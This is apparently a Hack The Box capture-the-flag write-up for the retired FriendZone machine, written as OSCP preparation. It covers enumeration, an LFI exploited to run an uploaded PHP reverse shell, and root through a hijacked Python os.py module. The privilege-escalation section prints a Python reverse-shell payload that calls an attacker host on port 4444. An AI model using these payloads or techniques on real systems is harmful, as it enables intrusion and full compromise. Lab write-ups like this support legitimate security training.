# :game_die: OSCP Preparation - Hack The Box #7 FriendZone

> **Original Source:** [OSCP Preparation - Hack The Box #7 FriendZone](https://infosecwriteups.com/oscp-preparation-hack-the-box-7-friendzone-208d444a97cc)
> **Platform:** infosecwriteups.com | **Category:** `MISC`

---

# OSCP Preparation — Hack The Box #7 FriendZone


Hey guys Hope Everyone is doing well.


This is the 7th blog out of a series of blogs i will be publishing on HTB Retired machines to document my progress to prepare for the OSCP. The Complete List of OSCP-like boxes created by TJ_Null can be found in this link — [HTB VMs](https://docs.google.com/spreadsheets/u/1/d/1dwSMIAPIam0PuRBkCiDI88pU3yzrqqHkDtBngUHNCw8/htmlview#)


Lets Begin!

## Reconnaissance


First up,Lets run a full TCP and UDP Scan.

>

nmap -sT -p- --min-rate 10000 -oA Nmap/tcpscan 10.10.10.123


We find port 21,22,53,80,139,443 and 445 open in the TCP Scan.


*Nmap TCP Scan*

>

nmap -sU -p- --min-rate 10000 -oA Nmap/udpscan 10.10.10.123


We find port 53 and 137 open in the UDP Scan.


*Nmap UDP Scan*


Lets perform a broad and deep scan on the specific ports to find more information.

>

nmap -sC -sV -p 21,22,53,80,137,139,443,445 -oA Nmap/fullscan 10.10.10.123


*Nmap Full Scan 1*


*Nmap Full Scan 2*


We get back the following result about the ports:


Port 21: ftp vsftpd 3.0.3.


Port 22: ssh OpenSSH 7.6p1 Ubuntu 4.


Port 53: domain ISC BIND 9.11.3–1ubuntu1.2.


Port 80 and 443: Apache httpd 2.4.29.


Port 139 and 445: netbios-ssn Samba smbd 4.7.6-Ubuntu.


One key thing to notice from our scan is the domain of the TLS certificate commonName=friendzone.red which could be quite useful.


We have got quite a lot of services to enumerate.

### Enumeration


### SMB (Port 139 and 445)


Lets Run smbmap to list available shares and permissions.

>

smbmap -H 10.10.10.123


*smbmap list shares*


We have READ access on the general share and READ/WRITE access on the Development share.


Lets list the content of the shares to see if we can find any files.

>

smbmap -R -H 10.10.10.123


*smbmap list content*


The Development share seems to be empty, but the general directory has a file called creds.txt.


lets use smbclient with anonymous login to see more information about the shares.

>

smbclient -N -L //10.10.10.123


*smbclient anonymous login*


We can see that the files in the Files share are stored in /etc/Files on the system. Therefore, general and Development shares could follow the same pattern.


To confirm this we can use nmap script scan.

>

nmap --script smb-enum-shares.nse -p 445 10.10.10.123


*\etc\Development\etc\general*


Now Lets login anonymously into the general share and get creds.txt.

>

smbclient -N //10.10.10.123/general


*smblient general directorrycreds.txt*


we get a *admin* username and *WORKWORKHhallelujah@# *password.

### FTP (Port 21)


From the scan, we know anonymous Login is not allowed and the version 3.0.3 doesn’t have any critical exploits.


The Credentials we got from SMB failed as well:

>

ftp 10.10.10.123


*ftp login*

### SSH(Port 22)


Similarly OpenSSH 7.6p1 Ubuntu 4 version doesn’t have any potential exploits.


The Credentials we got from SMB failed for SSH as well:

>

ssh admin@10.10.10.123


*ssh login*

### HTTP(Port 80)


### friendzone.red


>

http://friendzone.red


we find another possible domain friendzoneportal.red.


*friendzoneportal.red*


Lets use gobuster to enumerate directories.

>

gobuster dir -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -u [http://friendzone.red/](http://friendzone.red/) -t 200


*/wordpress/server-status*


Both directories didn’t provide anything useful.

### HTTPS(Port 443)


### friendzone.red


>

[https://friendzone.red/](https://friendzone.red/)


The site is just a meme with an animated gif.


*friendzone.red*


Lets use gobuster with to enumerate directories.


- -k : Skip TLS certificate verification

>

gobuster dir -k -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -u https://friendzone.red/ -t 200


*gobuster/admin/js/js*


*source code*


The source code of /js/js gave a indication with something about time and zones which could be a hint to look into DNS zones.

### DNS(Port 53)


Lets do zone transfer with dig.


## Get Tufail’s stories in your inbox


Join Medium for free to get updates from this writer.


Remember me for faster sign in


we do have two possible domains from previous enumeration steps:


- friendzone.red

- friendzoneportal.red

>

dig axfr friendzone.red @10.10.10.123


*zone transfer friendzone.red*

>

dig axfr friendzoneportal.red @10.10.10.123


*zone transfer friendzoneportal.red*


Transfer the contents of both domains to zone transfer.


*transfer contents*


Now we are going to use grep to sort out the domains and transfer them to ‘hosts’:

>

cat zonetransfer |grep friendzone|grep IN|awk ‘{print $1}’|sed ‘s/\.$//g’|sort -u


*domains*


*transfer to hosts*


update hosts in /etc/hosts


*/etc/hosts 1/etc/hosts 2*


We are going to use a tool called [aquatone](https://github.com/michenriksen/aquatone/releases/) to find out which domains we are able to access. Refer this [article](https://medium.com/@sherlock297/install-aquatone-on-kali-linux-dd2a6850fd32) to install the tool.


Before executing the tool we will create a directory ‘aquatone’ and copy the file ‘hosts’ we created to that directory.

*copy hosts*Subdomains on http(80)


All the subdomains on http seem to redirect back to the same site.


Subdomains on https(443)


Add https:// before every domain on the hosts.


*adding https://*


Lets run aquatone against the host file.

>

cat hosts | aquatone


*aquatone 1aquatone 2*

>

firefox aquatone_report.html


*aquatone_report.html*


We can view all the domains in this report without having to manually go and check each site.


There were 2 pages which seemed pretty interesting:

### admin.friendzoneportal.red


We logged in with smb credentials and found this :

*admin.friendzoneportal.redsuccessful login*

### administrator1.friendzone.red


Again, We logged in with smb credentials and found :

*administrator1.friendzone.redsuccessful login*


*/dashboard.php*


This page allows you to view images on the site and seems promising to give us an exploiting point.

## Exploitation


### Initial Foothold


The dashboard.php page gives us instructions on how to view an image. Lets add it to the URL:

>

https://administrator1.friendzone.red/dashboard.php?image_id=a.jpg&pagename=timestamp


*executing instructions*


pagename seems to be running a timestamp script that generates a timestamp and displays it on the page. it takes the filename “timestamp” and appends “.php” to it and then executes the script.


So pagename could be vulnerable to LFI (Local file include).To test it lets upload a simple php file to /etc/Development(READ AND WRITE) in shares and try calling it in the web page.

*test.php*

>

smbclient -N //10.10.10.123/Development


put test.php


[https://administrator1.friendzone.red/dashboard.php?image_id=a.jpg&pagename=/etc/Development/test](https://administrator1.friendzone.red/dashboard.php?image_id=a.jpg&pagename=%2Fetc%2FDevelopment%2Ftest)


*test script successful*


Perfect, it’s working! Lets get our default web shell from kali and edit the ip address and upload it similar to how we did test.php.


*upload reverse shell through smb*

>

[https://administrator1.friendzone.red/dashboard.php?image_id=a.jpg&pagename=/etc/Development/php-reverse-shell](https://administrator1.friendzone.red/dashboard.php?image_id=a.jpg&pagename=%2Fetc%2FDevelopment%2Fphp-reverse-shell)


The reverse shell script is executed and we have a Shell as www-data!


*www-data shell*


in /var/www,we find creds in the mysql_data.conf file.

*mysql_data.conf*


we managed to ssh in with the credentials.

>

ssh friend@10.10.10.123


*ssh login*


Grab the user flag!

*user.txt*

### Privilege Escalation — using Python Library Hijack


We executed a [pspy](https://github.com/DominicBreuker/pspy) tool script which we uploaded through /etc/Development, moved and executed it in /tmp

>

./pspy64


*./pspy64*


It seems the reporter.py script is getting executed every couple of minutes as a scheduled task.


Lets enumerate on this

>

ls -la /opt/server_admin/


cat /opt/server_admin/reporter.py


*reporter.py permissions*


*reporter.py*


We have read permission on the file and most of the script is commented out ,but we see import os which is interesting.

>

locate os.py


cd /usr/lib/python2.7


ls -la | grep os.py


*os.py locationfull permission for os.py*


We have rwx privileges on the os.py module. So we can try to upload a reverse shell to the script and wait for the scheduled task to run and catch the shell with nc.


Start a netcat listener on the attack machine.

>

nc -nlvp 4444


Lets add the reverse shell [payload](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet.md#python)(change ip and port)to the end of the os.py script and save it.

>

import socket,subprocess,os;
s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);
s.connect((“10.10.14.13”,4444));
dup2(s.fileno(),0);
dup2(s.fileno(),1);
dup2(s.fileno(),2);
p=subprocess.call([“/bin/sh”,”-i”]);


*os.py*


We wait for the scheduled task to run the reporter.py that calls the os.py module which contains our reverse shell.

*root shell*


And we get are ROOT!


Grab the root flag.

*root.txt*

## Conclusion


This box was a little bit challenging just due to the sheer amount of rabbit holes.So,it is important not to lose focus when enumerating each service/Web page and test things as they come.


Thank you for taking the time to read my write-up and I hope it was helpful. I will be continuing to tackle the TJ_Null’s list of recommended HTB Machines in order to best prepare for OSCP. Please consider following me for more such content.


p.s. I am always open to any suggestions and new ideas.


*TJ_Null’s OSCP-like Machines List*

---

*Originally published on [Medium](https://infosecwriteups.com/oscp-preparation-hack-the-box-7-friendzone-208d444a97cc). All credit goes to the original author.*
*Part of [CTF Collection](https://github.com/Hope0351/CTF-collection) — a curated archive of misc CTF writeups.*
